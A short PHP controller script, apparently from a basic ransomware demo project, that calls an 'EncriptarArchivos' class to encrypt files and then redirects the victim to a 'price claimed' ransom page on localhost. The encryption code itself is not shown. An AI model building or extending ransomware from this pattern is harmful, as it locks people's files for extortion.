<?php
   require_once '../model/encriptarDatos.php';

   $packageObject = "";
   
    $objeto = new EncriptarArchivos();
    $packageObject = $objeto->encriptar();

    header("Location: http://localhost/php-basic-ramsomware-MauricioPerez/views/precioReclamado.html");
?>